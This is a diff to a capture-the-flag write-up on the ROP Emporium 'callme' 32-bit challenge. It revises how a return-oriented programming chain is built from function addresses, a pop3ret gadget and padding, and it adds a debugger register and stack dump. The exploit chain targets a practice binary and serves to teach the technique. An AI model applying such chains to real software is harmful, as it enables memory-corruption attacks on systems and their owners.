@@ -50,7 +50,7 @@ So far we can build a piece of our ROP chain:
 call_one="\xc0\x85\x04\x08"
 call_two="\x20\x86\x04\x08"
 call_three="\xb0\x85\x04\x08"
-# arguments of the function calls (little endian format)
+# arguments of the function calls (little endia format)
 one="\x01\x00\x00\x00"
 two="\x02\x00\x00\x00"
 three="\x03\x00\x00\x00"
@@ -90,7 +90,16 @@ Uhm, the vaddr tagged as "pop3ret" seems interesting (pops 3 addresses from stac
 80488ac:	c3                   	ret    	# jmp to EIP, which contains the "call_X" vaddr
 ```
 Bingo. Now, we need to understand where to insert this gadget in our chain.
-It is easy if you think about what the gadget does and how the stack works. We would like end up with something like this on the stack:
+Here comes the trickiest part, we analyze the program execution with the incomplete chain as input to gather more information on how to build the latter. First of all, executing the program with the incomplete chain we can see that callme\_one is actually called but then the check for the parameters fails:
+```bash
+callme by ROP Emporium
+32bits
+
+Hope you read the instructions...
+> Incorrect parameters
+```
+Analyzing the binary we see that it is necessary to insert 4 bytes between the parameters and the function address to pass the check (offset from the EBP indexes the addresses on the stack). After inserting the 4 bytes of padding the check succeed but, since we do not have inserted the gadget yet, the chain is not activated and callme\_one jumps to an invalid address.
+The most interesting part of this analysis: we note that _the incorrect address where the jump lands is exactly our padding of 4 bytes_. So, this is the right place where to put our gadget. We would like end up with something like this on the stack:
 ```bash
 0x3
 0x2
@@ -98,12 +107,43 @@ It is easy if you think about what the gadget does and how the stack works. We w
 rop_gadget
 call_X_addr
 ```
-So that when rop\_gadget is executed we get the following state:
+Indeed, following the program execution with the right rop chain we can see the program point of callme\_one where the parameter check is performed:
 ```bash
-ESI=0x3 # pop result
-EDI=0x2 # pop result
-EBP=0x1 # pop result
-jump to call_X_addr # ret result
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd2f0 ("AAAA9O\376", <incomplete sequence \367>)
+EBX: 0xf7fce000 --> 0x1f0c 
+ECX: 0xf7fb889c --> 0x0 
+EDX: 0xffffd2f0 ("AAAA9O\376", <incomplete sequence \367>)
+ESI: 0xf7fb7000 --> 0x1d4d6c 
+EDI: 0x0 
+EBP: 0xffffd31c ("AAAA\251\210\004\b\001")
+ESP: 0xffffd304 ("AAAA\220\255\376\367\360\322\377\377\320\306\374\367\360\322\377\377")
+EIP: 0xf7fcc6e2 (<callme_one+18>: cmp    DWORD PTR [ebp+0x8],0x1)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xf7fcc6d4 <callme_one+4>: sub    esp,0x14
+   0xf7fcc6d7 <callme_one+7>: call   0xf7fcc5a0 <__x86.get_pc_thunk.bx>
+   0xf7fcc6dc <callme_one+12>:  add    ebx,0x1924
+=> 0xf7fcc6e2 <callme_one+18>:  cmp    DWORD PTR [ebp+0x8],0x1
+   0xf7fcc6e6 <callme_one+22>:  jne    0xf7fcc7ab <callme_one+219>
+   0xf7fcc6ec <callme_one+28>:  cmp    DWORD PTR [ebp+0xc],0x2
+   0xf7fcc6f0 <callme_one+32>:  jne    0xf7fcc7ab <callme_one+219>
+   0xf7fcc6f6 <callme_one+38>:  cmp    DWORD PTR [ebp+0x10],0x3
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd304 ("AAAA\220\255\376\367\360\322\377\377\320\306\374\367\360\322\377\377")
+0004| 0xffffd308 --> 0xf7fead90 (pop    edx)
+0008| 0xffffd30c --> 0xffffd2f0 ("AAAA9O\376", <incomplete sequence \367>)
+0012| 0xffffd310 --> 0xf7fcc6d0 (<callme_one>:  push   ebp)
+0016| 0xffffd314 --> 0xffffd2f0 ("AAAA9O\376", <incomplete sequence \367>)
+0020| 0xffffd318 --> 0x0 
+0024| 0xffffd31c ("AAAA\251\210\004\b\001")
+0028| 0xffffd320 --> 0x80488a9 (<__libc_csu_init+89>: pop    esi)
+0008| 0xffffd324 --> 0x1                                          <====  ebp+0x8
+0012| 0xffffd328 --> 0x2 
+0016| 0xffffd32c --> 0x3
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xf7fcc6e2 in callme_one () from ./libcallme32.so
 ```
 
 [Side Note:start]
@@ -121,7 +161,7 @@ The envar is checked by the dynamic linker, it instructs the linker to resolve a
 
 ### Execute the exploit
 
-Wrapping-up, we have built the following ROP chain:
+Wrapping up, we have built the following ROP chain:
 ```bash
 # vaddrs converted in little endian format (used by x86,x86_64 architectures)
 call_one="\xc0\x85\x04\x08"
@@ -136,9 +176,10 @@ pop3ret="\xa9\x88\x04\x08"
 # build current (incomplete) chain. remember: the stack uses a LIFO policy for its elements
 call_one+pop3ret+one+two+three+
 call_two+pop3ret+one+two+three+
-call_three+pop3ret+one+two+three
+call_three+"AAAA"+one+two+three
 ```
-Which you can better view in the script code shipped with this markdown file.
+In the last part of the chain we do not need another gadget because call\_three is not chained with other functions, 4 bytes of padding are enough to make the exploit work.
+You can better view the exploit in the script shipped with this markdown file.
 
 Result:
 ```bash
